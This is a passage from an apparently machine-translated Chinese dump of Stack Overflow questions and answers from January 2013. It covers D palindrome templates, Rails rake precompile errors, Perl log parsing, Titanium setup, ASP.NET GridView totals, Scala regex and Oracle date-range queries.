> 
> 时间：2013-01-22T23:08:09.200

像这样向第二个模板添加模板约束：

```
bool isPalindrome(Range)(Range r)
    if (!isArray!Range) 
```

您将需要导入模板`std.traits`。`isArray`

如果您只想使用第二个模板，则必须导入`std.array`使用`UFCS`（统一函数调用语法）以使数组具有`front`、`popFront`、`empty`等功能。

UFCS 基本上意味着：

```
int[] x;
int f = x.front; 
```

被翻译成：

```
int f = front(x); 
```

`front`和其他是为 中的数组定义的`std.array`，这使您可以像使用范围一样使用数组。您可以对自己的类型使用相同的技术。您可以在结构/类内部定义范围函数`front`，也可以在外部将它们定义为以结构/类作为第一个参数的函数。

有关更多信息，请参阅[std.range的文档。](http://dlang.org/phobos/std_range.html)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-01-23T12:46:49.193

另请注意，通用版本中存在一个令人尴尬的错误，因为它可能会尝试减少空范围。一个更正的版本是：

```
bool isPalindrome(Range)(Range r)
{
    while (!r.empty) {
        if (a.front != a.back) {
          return false;
        }
        r.popFront();
        if (r.empty) {
            return true;
        }
        r.popBack();
    }
    return true;
} 
```

# ruby-on-rails - rake assets:precompile aborting

> ID：14469619
> 
> 赞同：1
> 
> 时间：2013-01-22T22:57:57.457
> 
> 标签：ruby-on-rails, rake

一个小时前我能够预编译资产，但现在 rake 任务正在中止。我还在另一个应用程序上检查它，它也在那里中止。我相当突然地中断了对 Heroku 的推送，并且从那时起就无法进行预编译。

```
bundle exec rake assets:precompile
rake aborted!
undefined method `prerequisites' for nil:NilClass
/Users/mm/Sites/quoraquora/Rakefile:7:in `<top (required)>'
(See full trace by running task with --trace) 
```

rake 文件的第 7 行是这段代码 Enki::Application.load_tasks

```
require File.expand_path('../config/application', __FILE__)

Enki::Application.load_tasks 
```

我也做了一个捆绑更新，但它没有改变任何东西。在尝试运行 rake 任务之前，我突然停止了对 Heroku 的推送，因为我忘记了编译资产。不确定这是否会导致任何事情。有趣的是，该应用程序仍然在 localhost 上运行。

我尝试在另一个应用程序上运行 bundle exec rake assets:precompile ，但我也遇到了一个错误，尽管另一个错误说即使安装了该 gem，它也无法找到“uglifier”。

```
bundle exec rake assets:precompile
/Users/mm/.rbenv/versions/1.9.3-p327/bin/ruby /Users/mm/.rbenv/versions/1.9.3-p327/bin/rake assets:precompile:all RAILS_ENV=production RAILS_GROUPS=assets
rake aborted!
cannot load such file -- uglifier
  (in /Users/mm/Sites/railshangman/app/assets/javascripts/admin.js)

Tasks: TOP => assets:precompile:primary
(See full trace by running task with --trace)
rake aborted!
Command failed with status (1): [/Users/mm/.rbenv/versions...]

Tasks: TOP => assets:precompile 
```

这是第一次中止的完整跟踪。谁能解释一下？这个问题似乎超出了一个特定应用程序的范围，因为`bundle exec rake assets:precompile`一小时前每个应用程序都运行良好。

```
Macintosh-3:coffeelover mm$ bundle exec rake assets:precompile --trace
rake aborted!
undefined method `prerequisites' for nil:NilClass
/Users/mm/.rbenv/versions/1.9.3-p327/lib/ruby/gems/1.9.1/gems/rspec-rails-2.0.1/lib/rspec/rails/tasks/rspec.rake:3:in `<top (required)>'
/Users/mm/.rbenv/versions/1.9.3-p327/lib/ruby/gems/1.9.1/gems/activesupport-3.2.11/lib/active_support/dependencies.rb:245:in `load'
/Users/mm/.rbenv/versions/1.9.3-p327/lib/ruby/gems/1.9.1/gems/activesupport-3.2.11/lib/active_support/dependencies.rb:245:in `block in load'
/Users/mm/.rbenv/versions/1.9.3-p327/lib/ruby/gems/1.9.1/gems/activesupport-3.2.11/lib/active_support/dependencies.rb:236:in `load_dependency'
/Users/mm/.rbenv/versions/1.9.3-p327/lib/ruby/gems/1.9.1/gems/activesupport-3.2.11/lib/active_support/dependencies.rb:245:in `load'
/Users/mm/.rbenv/versions/1.9.3-p327/lib/ruby/gems/1.9.1/gems/rspec-rails-2.0.1/lib/rspec-rails.rb:10:in `block in <class:Railtie>'
/Users/mm/.rbenv/versions/1.9.3-p327/lib/ruby/gems/1.9.1/gems/railties-3.2.11/lib/rails/railtie.rb:184:in `instance_exec'
/Users/mm/.rbenv/versions/1.9.3-p327/lib/ruby/gems/1.9.1/gems/railties-3.2.11/lib/rails/railtie.rb:184:in `block in load_tasks'
/Users/mm/.rbenv/versions/1.9.3-p327/lib/ruby/gems/1.9.1/gems/railties-3.2.11/lib/rails/railtie.rb:184:in `each'
/Users/mm/.rbenv/versions/1.9.3-p327/lib/ruby/gems/1.9.1/gems/railties-3.2.11/lib/rails/railtie.rb:184:in `load_tasks'
/Users/mm/.rbenv/versions/1.9.3-p327/lib/ruby/gems/1.9.1/gems/railties-3.2.11/lib/rails/engine.rb:423:in `block in load_tasks'
/Users/mm/.rbenv/versions/1.9.3-p327/lib/ruby/gems/1.9.1/gems/railties-3.2.11/lib/rails/application/railties.rb:8:in `each'
/Users/mm/.rbenv/versions/1.9.3-p327/lib/ruby/gems/1.9.1/gems/railties-3.2.11/lib/rails/application/railties.rb:8:in `all'
/Users/mm/.rbenv/versions/1.9.3-p327/lib/ruby/gems/1.9.1/gems/railties-3.2.11/lib/rails/engine.rb:423:in `load_tasks'
/Users/mm/.rbenv/versions/1.9.3-p327/lib/ruby/gems/1.9.1/gems/railties-3.2.11/lib/rails/application.rb:145:in `load_tasks'
/Users/mm/.rbenv/versions/1.9.3-p327/lib/ruby/gems/1.9.1/gems/railties-3.2.11/lib/rails/railtie/configurable.rb:30:in `method_missing'
/Users/mm/Sites/coffeelover/Rakefile:7:in `<top (required)>'
/Users/mm/.rbenv/versions/1.9.3-p327/lib/ruby/gems/1.9.1/gems/rake-10.0.3/lib/rake/rake_module.rb:25:in `load'
/Users/mm/.rbenv/versions/1.9.3-p327/lib/ruby/gems/1.9.1/gems/rake-10.0.3/lib/rake/rake_module.rb:25:in `load_rakefile'
/Users/mm/.rbenv/versions/1.9.3-p327/lib/ruby/gems/1.9.1/gems/rake-10.0.3/lib/rake/application.rb:583:in `raw_load_rakefile'
/Users/mm/.rbenv/versions/1.9.3-p327/lib/ruby/gems/1.9.1/gems/rake-10.0.3/lib/rake/application.rb:89:in `block in load_rakefile'
/Users/mm/.rbenv/versions/1.9.3-p327/lib/ruby/gems/1.9.1/gems/rake-10.0.3/lib/rake/application.rb:160:in `standard_exception_handling'
/Users/mm/.rbenv/versions/1.9.3-p327/lib/ruby/gems/1.9.1/gems/rake-10.0.3/lib/rake/application.rb:88:in `load_rakefile'
/Users/mm/.rbenv/versions/1.9.3-p327/lib/ruby/gems/1.9.1/gems/rake-10.0.3/lib/rake/application.rb:72:in `block in run'
/Users/mm/.rbenv/versions/1.9.3-p327/lib/ruby/gems/1.9.1/gems/rake-10.0.3/lib/rake/application.rb:160:in `standard_exception_handling'
/Users/mm/.rbenv/versions/1.9.3-p327/lib/ruby/gems/1.9.1/gems/rake-10.0.3/lib/rake/application.rb:70:in `run'
/Users/mm/.rbenv/versions/1.9.3-p327/lib/ruby/gems/1.9.1/gems/rake-10.0.3/bin/rake:33:in `<top (required)>'
/Users/mm/.rbenv/versions/1.9.3-p327/bin/rake:23:in `load'
/Users/mm/.rbenv/versions/1.9.3-p327/bin/rake:23:in `<main>' 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-24T03:48:59.543

尝试更新您的 rake 和 rspec-rails 版本

```
bundle update rspec-rails
bundle update rake 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-25T16:59:34.277

我不得不将我的 rspec-rails 版本更新到 2.6.0（从 2.0 开始）。奇怪的是，如果我删除 gemfile.lock 并进行捆绑更新，这不会自动发生。我必须在 Gemfile 中手动设置版本。

# perl - Perl 问题从不同行提取、操作和合并相关数据

> ID：14469622
> 
> 赞同：0
> 
> 时间：2013-01-22T22:58:12.233
> 
> 标签：perl, parsing, merge

**我有一个非常具体的问题，我无法解决，它与解析和合并来自不同行的相关数据有关**

我有一个文件，其中包含格式如下所示的文本：

```
======================================================
8:27:24 PM  http://10.11.12.13:80
======================================================
GET /dog-pictures HTTP/1.1
Host: 10.11.12.13
Language: english
Agent: Unknown
Connection: closed

======================================================

======================================================
8:28:56 PM  http://192.114.126.245:80
======================================================
GET /flowers HTTP/1.1
Host: 10.11.12.13
Language: english

======================================================

======================================================
8:29:07 PM  http://10.11.12.13:80
======================================================
GET /africas-animals HTTP/1.1
Host: 10.11.12.13
Language: english
Agent: Unknown
Connection: open

====================================================== 
```

正如您在上面看到的，文本文件中的*每组*数据由三行等号 (=======) 组成，但其中可以包含不同数量的数据行。

**我需要输出的格式如下：**

```
 http://10.11.12.13/dog-pictures
    http://192.114.126.245/flowers
    http://10.11.12.13/africas-animals 
```

**我需要合并的位的解释：**

```
======================================================
8:27:24 PM  http://10.11.12.13:80                     <--- Gets the first part from here**
======================================================
GET /dog-pictures HTTP/1.1                            <--- Gets the seconds part from here**
Host: 10.11.12.13
Language: english
Agent: Unknown
Connection: closed

====================================================== 
```

**非常感谢您对这个问题的帮助，在此先感谢您**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-22T23:16:16.560

尝试`Perl`在 a中执行此操作`shell`：

```
perl -lane '
    if (/^\d+:\d+:\d+\s+\w+\s+([^:]+):/) {
        $scheme = $1;
    }
    if (/^(GET|HEAD|POST|PUT|DELETE|OPTION|TRACE)/) {
        $path = $F[1];
    }
    if (/^Host/) {
        print "$scheme://$F[1]$path";
    }
' file.txt 
```

## 脚本版本

通过`perl -MO=Deparse`一些调整生成...

```
#!/usr/bin/env perl
# mimic `-l` switch to print like "say"
BEGIN { $/ = "\n"; $\ = "\n"; }

use strict; use warnings;

my ($scheme, $path);

# magic diamond operator
while (<ARGV>) {
    chomp $_;
    # splitting current line in @F array
    my (@F) = split(' ', $_, 0);

    # regex to catch the scheme (http)
    if (/^\d+:\d+:\d+\s+\w+\s+([^:]+):/) {
        $scheme = $1;
    }
    # if the current line match an HTTP verb, we feed $path variable
    # with second column
    if (/^(GET|HEAD|POST|PUT|DELETE|OPTION|TRACE)/) {
        $path = $F[1];
    }
    # if the current line match HOST, we print the needed line
    if (/^Host/) {
        print "${scheme}://$F[1]$path";
    }
} 
```

## 用法

```
chmod +x script.pl
./script.pl file.txt 
```

## 输出

```
http://10.11.12.13/dog-pictures
http://10.11.12.13/flowers
http://10.11.12.13/africas-animals 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-23T03:05:16.667

也许以下内容会对您有所帮助：

```
use strict;
use warnings;

open my $fh, '<', 'data.txt' or die $!;

# Read a file line
while (<$fh>) {

    # If url captured on line beginning with time and read (separator) line
    if ( my ($url) = /^\d+:\d+:\d+.+?(\S+):\d+$/ and <$fh> ) {

        # Capture path
        my ($path) = <$fh> =~ /\s+(\/\S+)\s+/;

        print "$url$path\n" if $url and $path;
    }
} 
```

输出：

```
http://10.11.12.13/dog-pictures
http://192.114.126.245/flowers
http://10.11.12.13/africas-animals 
```

只有两行包含您想要的信息，它们之间用等号分隔。第一个正则表达式尝试匹配时间字符串并捕获该行上的 url。`and <$fh>`用于通过分隔符。第二个正则表达式捕获下一行的路径。最后打印出url和路径。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-23T06:17:13.397

珀尔：

```
perl -F -lane 'if(/http/){$x=$F[2]}if(/GET/){print $x.$F[1]}' your_file 
```

如果你想去 awk：

```
awk '/http/{x=$3}/GET/{print x""substr($2,1)}' your_file 
```

# titanium - Titanium Appcelerator - 无法创建新项目和 iOS 模拟器未运行厨房水槽

> ID：14469623
> 
> 赞同：0
> 
> 时间：2013-01-22T22:58:13.070
> 
> 标签：titanium, appcelerator, titanium-mobile, appcelerator-mobile

我在 Mac OS（Mountain Lion - 10.8.2）上全新安装了 Titanium Appcelerator；我对 Titanium Studio + SDK + GIT 进行了所有更新，它确认 iOS 框架（Xcode 4.5.2、iOS 6）已正确安装，但我遇到了两个问题：

*   在 iPad / iPhone iOS 设备模拟器上运行厨房水槽时，我收到“正在启动 (iPad/iPhone) 模拟器 - '厨房水槽'遇到问题”消息

*   当我尝试创建一个全新的项目时，我收到“无法创建项目”消息

两种情况下的错误详细信息都以：

> 启动模拟器进程失败[错误]：错误：ENOENT，没有这样的文件或目录'/Users/(user_name)/.titanium/auth_session.json'

我已经尝试清除/删除第一个错误的构建文件夹，但没有任何变化。

我的用户文件夹下的 .titanium 文件夹根本不存在。我已经卸载并重新安装了几次。再次，没有变化。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-23T08:27:53.077

我通过手动安装钛解决了这个问题。

```
 # Mac & Linux
    sudo npm install -g titanium

    # Windows
    npm install -g titanium 
```

# javascript - 下载/上传后出现不需要的双滚动条

> ID：14469624
> 
> 赞同：-1
> 
> 时间：2013-01-22T22:58:17.757
> 
> 标签：javascript, html

我是网页设计的初学者。

我的朋友想让我在他的网站上做一些工作，只是改变一些内容。

这是网站： http: [//www.newavenuesolutions.net/manage.html](http://www.newavenuesolutions.net/manage.html)

每次我下载文件进行处理然后上传时，这些奇怪的非功能双滚动条就会出现。

即使我尝试只是简单地下载文件，进行零更改，然后再次上传，同样的事情发生了！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-22T23:34:34.447

仅在此特定页面上删除它的最快方法是删除对 j​​Query customscroll 插件的调用，因为它似乎有点损坏。

请注意，在小型显示器上，这可能意味着它具有标准滚动条而不是花哨的滚动条，但这可能是您可以接受的折衷方案。

`</head>`要删除对添加精美滚动条的插件的调用，请从标记之前删除以下行：

```
<script type="text/javascript">
$( document ).ready( function() {
$( "div[rel='scrollcontent1']" ).customscroll( { direction: "vertical" } );});
</script> 
```

# ruby-on-rails-3 - Rails 3地理编码器和过滤对象

> ID：14469630
> 
> 赞同：0
> 
> 时间：2013-01-22T22:59:10.030
> 
> 标签：ruby-on-rails-3, geocode

我正在尝试让地理编码器 gem 处理已使用 has_many 关系过滤的对象

像这样

```
user.rb
has_one :profile
has_many :roles

name:string

profile.rb
belongs_to :user

latitude,latitude:float, address:string, city:string

role.rb
belongs_to :user
name:string 
```

我遇到的问题是我需要过滤角色说 id => 3

所以我们有

```
@limitrole = User.includes(:profile, :roles).where('roles.id' => 3) 
```

这将返回一个角色有限的对象，现在获取包含地理编码内容的配置文件

```
@profiles = @limitrole.collect { |user| user.profile } 
```

这将返回一个仅限于用户角色的地址对象

但这行不通

```
@findlocations = @profiles.near('city, country', 20) (city and country being arbitrary values) 
```

然而这会奏效

```
@findlocations = Profile.near('city, country', 20) 
```

@profiles 应该与 Profile（两个对象）相同，只是 @profiles 已被过滤。

我怎样才能让它工作？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-23T19:02:25.320

这可能不是乱七八糟的，但这就是我让它工作的方式

首先抓取表单域

```
@findaddress = params[:profile][:profileaddress] + ", " + params[:profile][:profilecity] 
```

接下来，我根据角色获取了用户列表

```
@limituser = User.includes(:profile, :roles).where('roles.id' => 3) 
```

接下来使用地理编码器（railscast #273）插件，我创建了一个列表，其中列出了表单中指定位置附近的所有地理编码地址（@findaddress）并获取 user_id

```
@findlocations = Profile.near(@findaddress, 20).pluck(:user_id) 
```

现在我可以创建一个用户列表，由表单字段指定的角色和地址过滤

```
@filteruser = @limituser.where(:id => @findlocations) 
```

# .net - httpClient.PostAsync - Windows 商店应用程序 - mvc webapi

> ID：14469631
> 
> 赞同：1
> 
> 时间：2013-01-22T22:59:10.827
> 
> 标签：.net, windows, asp.net-mvc-4, windows-runtime

这是我在此页面上的第一个问题。我在 mvc webapi 和 Windows Store 应用程序中有应用程序，我想用 W8 应用程序向 web api 请求我的对象：

我的对象：

```
 var objobj = new ObjectCompleteAdd()
            {
                NameObject = "Name",
                DescriptionObject = "Description",
                isActveObject = true,
                ContractStartObject = DateTime.Parse("2005-09-01"),
                CityAdress = " CityAdress",
                PostCodeAdress = "PostCode",
} 
```

BLL 中的类：

```
 public class ObjectCompleteAdd
    {  
        public string NameObject { get; set; }
        public string DescriptionObject { get; set; }
        public bool? isActveObject { get; set; }
        public DateTime ContractStartObject { get; set; }
        public string CityAdress { get; set; }
        public string PostCodeAdress { get; set; }
} 
```

和我的功能：

```
 var dataContractSerializer = new DataContractJsonSerializer(typeof(ObjectCompleteAdd));
            var memoryStream = new MemoryStream();
            dataContractSerializer.WriteObject(memoryStream, objobj);
            HttpContent content = new StreamContent(memoryStream);  

            await client.PostAsync("api/ObjectISApi",content); 
```

在 webapi 我有帖子：

```
 // POST api/ObjectISApi    
        public HttpResponseMessage PostObjectIS(ObjectCompleteAdd obj)
        {     
            ObjectIS.AddNewObject(obj);
            return Request.CreateResponse(HttpStatusCode.OK);

        } 
```

它不起作用

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-23T00:39:34.077

序列化对象后，倒回流，将位置设置为零：

```
var dataContractSerializer = new DataContractJsonSerializer(typeof(ObjectCompleteAdd));
var memoryStream = new MemoryStream();
dataContractSerializer.WriteObject(memoryStream, objobj);

// Rewind stream.
memoryStream.Position = 0;

HttpContent content = new StreamContent(memoryStream); 
```

**更新：**好吧，我认为您还需要修改服务器代码，以正确反序列化您发送的 JSON 对象。ASP.NET 不会自动反序列化 JSON。

```
public ActionResult PostObjectIS()
{
    StreamReader reader = new StreamReader(Request.InputStream);
    string contentString = reader.ReadToEnd();

    JavaScriptSerializer jsonSerializer = new JavaScriptSerializer();
    var oca = jsonSerializer.Deserialize<ObjectCompleteAdd>(contentString);
    Debug.WriteLine(oca.NameObject);

    return View();
} 
```

# ios - 设置 UILabel 文本不起作用？

> ID：14469636
> 
> 赞同：1
> 
> 时间：2013-01-22T22:59:29.130
> 
> 标签：ios, uilabel

我有这个需要设置 UILabel 文本的 XML 解析器类。由于某种原因，当我从 XML 解析类调用我的外部（我的外部自定义方法位于 ViewController 中）自定义方法时，我无法更改标签文本。像 NSLogging 或 UIAlert 这样的其他任何东西都可以。
我尝试使用的代码：
**XML Parsing class**

```
-(void) parser:(NSXMLParser *) parser didStartElement:(NSString *)elementName namespaceURI:(NSString *)namespaceURI qualifiedName:(NSString *)qName attributes:(NSDictionary *)attributeDict{
    if([elementName isEqualToString:@"names"]){
        NSLog(@"Found names body");

    }
    else if ([elementName isEqualToString:@"user"]){

 array = [attributeDict objectForKey:@"nameofuser"];
        ViewController * main = [[ViewController alloc] init];
        [main outputToLabel:array];

    }
    NSLog(@"Reading value: %@", elementName);
} 
```

这是我的 ViewController 自定义方法：

```
-(void) outputToLabel:(NSArray *) dict{

    NSLog(@"seting %@ srcds", dict);
    // XML stuff here \/

NSLog(@"%@", dict);

       //                 /\

    this.text = @"Complete";
} 
```

它 NSLogs 正确地输出值和所有内容......我只是无法设置标签文本。我可以在 viewDidLoad 中使用该代码，它工作正常。有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-23T03:12:44.637

```
 ViewController * main = [[ViewController alloc] init];
    [main outputToLabel:array]; 
```

您正在创建 ViewController 的新实例并在其中设置标签。ViewController 的“真实”实例不受此操作的影响。

# c++ - 确定最明显的前景色

> ID：14469638
> 
> 赞同：4
> 
> 时间：2013-01-22T22:59:34.897
> 
> 标签：c++, algorithm, qt, colors

> **可能重复：**
> [给定背景颜色的良好文本前景色](https://stackoverflow.com/questions/946544/good-text-foreground-color-for-a-given-background-color)

在 Photoshop 颜色选择器中，当您选择一种颜色时，选择器变为黑色或白色，具体取决于哪个最明显（参见图片）。他们使用什么算法，特别是，我想输入一个 rgb 值并返回黑色或白色。

我尝试了以下方法，虽然它有效，但不如 Photoshop 准确。

```
if (color.makeGray() < 128)
    return white;
else
    return black; 
```

![在此处输入图像描述](../Images/93e63e5f0f860a2ec73cb40b7b3c4b2a.png)

# c# - 在gridview中逐行添加单元格内容

> ID：14469642
> 
> 赞同：1
> 
> 时间：2013-01-22T22:59:57.663
> 
> 标签：c#, asp.net

有人可以帮我解决这个问题吗？我有一个返回 nmumeric 值的网格视图。第一列始终是类别，并且总是有十一个。出于说明目的，我只显示了三个 columsa 和两行。第一个数字是我拥有的，第二个是我需要的。

```
Event type | JAN-01 | Feb-01 | Mar-01
---------------------------------------
| Item 1   |  21    |    100 |   0
--------------------------------------- 
| Item 2   |  5     |    1   |   67
---------------------------------------

Event type | TOTAL
---------------------
| Item 1   |  121   | 
--------------------- 
| Item 2   |   73   | 
--------------------- 
```

我正在玩的代码是这样的。网格视图标记：

```
 <td>
     <asp:GridView ID="gvSystemRMRiskRpt" runat="server" AutoGenerateColumns="true" CellPadding="3"
         PageSize="25" BackColor="White" BorderColor="MidnightBlue" BorderStyle="Groove"
         BorderWidth="1px" CssClass="TextCompact" GridLines="Vertical" OnRowDataBound="gvSystemRMRiskRpt_OnDataBound"
          EmptyDataText="Your request has returned zero records">
          <EmptyDataRowStyle BackColor="#000084" Font-Bold="True" ForeColor="White" />
          <RowStyle BackColor="#EEEEEE" ForeColor="Black" />
          <SelectedRowStyle BackColor="#008A8C" Font-Bold="True" ForeColor="White" />
          <PagerStyle BackColor="#999999" ForeColor="Black" HorizontalAlign="Center" />
          <HeaderStyle BackColor="#000084" Font-Bold="True" ForeColor="White" />
          <AlternatingRowStyle BackColor="Gainsboro" />
          <FooterStyle BackColor="#CCCCCC" ForeColor="Black" VerticalAlign="Top" />
      </asp:GridView>
  </td> 
```

然后是代码文件：

```
protected void btnSearch_Click(object sender, EventArgs e)
{
    Guid site = new Guid(ddlSites.SelectedValue);
    int interval = Convert.ToInt16(ddlIntervals.SelectedValue);
    string[] startDate = tbStartDate.Text.Split('/');
    string[] stopDate = tbEndDate.Text.Split('/');

    DataTable _dt = RMRiskData.dtESRByMonthYear(connectionManager, site, startDate[1], stopDate[1], interval);
    gvSystemRMRiskRpt.DataSource = _dt;
    gvSystemRMRiskRpt.DataBind();

    lblSelectedSite.Text = ddlSites.SelectedItem.ToString();
}

protected void gvSystemRMRiskRpt_OnDataBound(object sender, GridViewRowEventArgs e)
{
    _totals = 0;
    // Formats columns headers
    if (e.Row.RowType == DataControlRowType.Header)
    {
        string[] _dateParse;
        string _year = string.Empty;
        string _month = string.Empty;

            switch (ddlIntervals.SelectedValue.ToString())
            {
                case "1":
                    for (int i = 1; i <= e.Row.Cells.Count - 1; i++)
                    {
                        _dateParse = e.Row.Cells[i].Text.Split('-');
                        _year = _dateParse[0].ToString().Remove(0, 2);
                        _month = getMonthAccronyms(_dateParse[1].ToString());
                        e.Row.Cells[i].Text = _month + "-" + _year;
                        e.Row.Cells[i].Attributes.Add("style", "white-space: nowrap;");
                        _dateParse = null;
                    }
                    break;

                case "2":
                    for (int i = 1; i <= e.Row.Cells.Count - 1; i++)
                    {
                        _dateParse = e.Row.Cells[i].Text.Split('-');
                        _year = _dateParse[0].ToString();
                        e.Row.Cells[i].Text = _year;
                    }
                    break;

                case "3":
                    e.Row.Cells[1].Text = "Totals";

                    break;

                default:
                    for (int i = 1; i <= e.Row.Cells.Count - 1; i++)
                    {
                        _dateParse = e.Row.Cells[i].Text.Split('-');
                        _year = _dateParse[0].ToString().Remove(0, 2);
                        _month = getMonthAccronyms(_dateParse[1].ToString());
                        e.Row.Cells[i].Text = _month + "-" + _year;
                        _dateParse = null;
                    }
                    break;
            }

    }

    // Formats mumbers to add comma separators
    int _number1 = 0;

    if (e.Row.RowType == DataControlRowType.DataRow)
    {
        if (ddlIntervals.SelectedValue.ToString() == "3")
        {
            CultureInfo ci = new CultureInfo("en-US");

            for (int i = 1; i <= e.Row.Cells.Count - 1; i++)
            {
                if (e.Row.Cells[i].Text.ToString() != "&nbsp;")
                {
                    _number1 = Convert.ToInt32(e.Row.Cells[i].Text);
                    _totals = _totals + _number1;
                }

               e.Row.Cells[i].Text = _totals.ToString("#,##0", ci);
            }
        }
        else
        {
            CultureInfo ci = new CultureInfo("en-US");
            int _number = 0;
            for (int i = 1; i <= e.Row.Cells.Count - 1; i++)
            {
                if (e.Row.Cells[i].Text.ToString() != "&nbsp;")
                {
                    _number = Convert.ToInt32(e.Row.Cells[i].Text);
                    e.Row.Cells[i].Text = _number.ToString("#,##0", ci);
                }
                else
                {
                    e.Row.Cells[i].Text = "0";
                }
            }
        }
    }
} 
```

我现在得到的结果是这样的：

```
 Event type | TOTAL| FEB-02
----------------------------
| Item 1   |  121   |  97   |
--------------------- -------
| Item 2   |   73   |  21   |
----------------------------- 
```

我将不胜感激！

谢谢，

理庄

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-23T00:00:11.327

试试下面的。

ASPX：

```
<asp:GridView ID="gvData" runat="server" AutoGenerateColumns="false">
    <Columns>
        <asp:BoundField DataField="EventType" HeaderText="Event Type" />
        <asp:TemplateField HeaderText="Total">
            <ItemTemplate>
                <asp:Literal ID="litSum" runat="server" />
            </ItemTemplate>
        </asp:TemplateField>
    </Columns>
</asp:GridView> 
```

C＃：

```
protected void Page_Load(object sender, EventArgs e)
{
    gvData.RowDataBound += gvData_RowDataBound;
    gvData.DataSource = CreateData();
    gvData.DataBind();
}

void gvData_RowDataBound(object sender, GridViewRowEventArgs args)
{
    if (args.Row.RowType == DataControlRowType.DataRow)
    {
        Literal litSum = (Literal)args.Row.FindControl("litSum");
        DataRow data = ((DataRowView)args.Row.DataItem).Row;

        int sum = 0;
        for (int i = 1; i < data.ItemArray.Length; i++)
        {
            sum += Convert.ToInt32(data.ItemArray[i]);
        }

        litSum.Text = sum.ToString();
    }
}

protected static DataTable CreateData()
{
    DataTable dt = new DataTable();
    dt.Columns.Add("EventType", typeof(string));
    dt.Columns.Add("JAN-01", typeof(int));
    dt.Columns.Add("FEB-01", typeof(int));
    dt.Columns.Add("MAR-01", typeof(int));

    dt.Rows.Add("Item 1", 21, 100, 0);
    dt.Rows.Add("Item 2", 5, 1, 67);            

    return dt;
} 
```

我不确定这是否是执行此操作的最佳位置，但由于这是一个小型记录集，您应该没问题。

# regex - 如何使scala正则表达式findAllIn转义字符括在单引号内

> ID：14469644
> 
> 赞同：0
> 
> 时间：2013-01-22T23:00:00.357
> 
> 标签：regex, scala, escaping

我需要使用正则表达式计算 i18n 项目的参数数量，如下所示

```
new Regex("\\{.*?\\}").findAllIn("{1},{2},{3} '{'4'}'").length 
```

应该返回 3 而不是 4。有人可以帮助我的正则表达式吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-22T23:03:04.770

如果参数只能包含数字，请将模式替换为以下模式：

```
\\{\\d+\\} 
```

# sql - 如何按键生成日期范围的行

> ID：14469652
> 
> 赞同：2
> 
> 时间：2013-01-22T23:01:09.923
> 
> 标签：sql, oracle

我在使用以下查询时遇到问题：

```
SELECT
    B.EMPLOYEE_NAME,
    A.START_DATE+(LEVEL-1) AS INDIVIDUAL_DAY,
    TO_CHAR(A.START_DATE,'MM/DD/YYYY') START_DATE,
    TO_CHAR(A.END_DATE,'MM/DD/YYYY') END_DATE
FROM table1 A
INNER JOIN table2 B ON A.EMPLOYEE_NAME = B.EMPLOYEE_NAME
CONNECT BY LEVEL-1 <= (A.END_DATE-A.START_DATE); 
```

如果表 A 中只有一条记录，那么我得到的正是我想要的。但是，如果有多个记录，那么我会得到过多的结果。

**我在找什么：**

我有一个表，其中的行包含`EMPLOYEE_NAME`、`START_DATE`和`END_DATE`字段。我想把这一行信息变成多行。例子：

当前的 -

```
NAME          START       END
DAVID SMITH   1-1-2001    1-6-2011
JOHN SMITH    2-7-2012    2-9-2012 
```

期望 -

```
NAME          DATE
DAVID SMITH   1-1-2001
DAVID SMITH   1-2-2001
DAVID SMITH   1-3-2001
DAVID SMITH   1-4-2001
DAVID SMITH   1-5-2001
DAVID SMITH   1-6-2001
JOHN SMITH    2-7-2012
JOHN SMITH    2-8-2012
JOHN SMITH    2-9-2012 
```

关于我如何做到这一点的任何想法？**注意：**我使用的是 Oracle 10 和 11。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-22T23:12:23.043

在 10g/11g 中，您可以为此使用模型子句。

```
SQL> with emps as (select rownum id, name, start_date,
  2                       end_date, trunc(end_date)-trunc(start_date) date_range
  3                  from table1)
  4  select name, the_date
  5    from emps
  6  model partition by(id as key)
  7        dimension by(0 as f)
  8        measures(name, start_date, cast(null as date) the_date, date_range)
  9        rules (the_date [for f from 0 to date_range[0] increment 1]  = start_date[0] + cv(f),
 10               name[any] = name[0]);

NAME        THE_DATE
----------- ----------
DAVID SMITH 01-01-2001
DAVID SMITH 01-02-2001
DAVID SMITH 01-03-2001
DAVID SMITH 01-04-2001
DAVID SMITH 01-05-2001
DAVID SMITH 01-06-2001
JOHN SMITH  02-07-2012
JOHN SMITH  02-08-2012
JOHN SMITH  02-09-2012

9 rows selected. 
```

即您的基本查询：

```
select rownum id, name, start_date,
       end_date, trunc(end_date)-trunc(start_date) date_range
  from table1 
```

只定义日期+范围（我使用rownum id，但如果你有PK，你可以使用它。

分区将我们的计算拆分为每个 ID（唯一行）：

```
6  model partition by(id as key) 
```

措施：

```
8        measures(name, start_date, cast(null as date) the_date, date_range) 
```

定义我们将输出/计算的属性。在这种情况下，我们使用名称、start_date 以及要生成的行范围。另外我定义了一个列`the_date`来保存计算的日期（即我们想要计算 start_date + n 其中 n 是从 0 到范围。

规则定义了我们将如何填充我们的列：

```
9        rules (the_date [for f from 0 to date_range[0] increment 1]  = start_date[0] + cv(f),
10               name[any] = name[0]); 
```

所以与 

```
the_date [for f from 0 to date_range[0] increment 1] 
```

我们是说我们将生成 date_range 包含的行数+1（即总共 6 个日期）。的值`f`可以通过`cv`（当前值）函数引用。

所以在大卫的第 1 行，我们有`the_date [0] = start_date+0`，随后在第 2 行，我们有`the_date [1] = start_date+1`. 一直到 start_date+5（即`end_date`）

ps for connect by 你需要做这样的事情：

```
select 
    A.EMPLOYEE_NAME,
    A.START_DATE+(b.r-1) AS INDIVIDUAL_DAY,
    TO_CHAR(A.START_DATE,'MM/DD/YYYY') START_DATE,
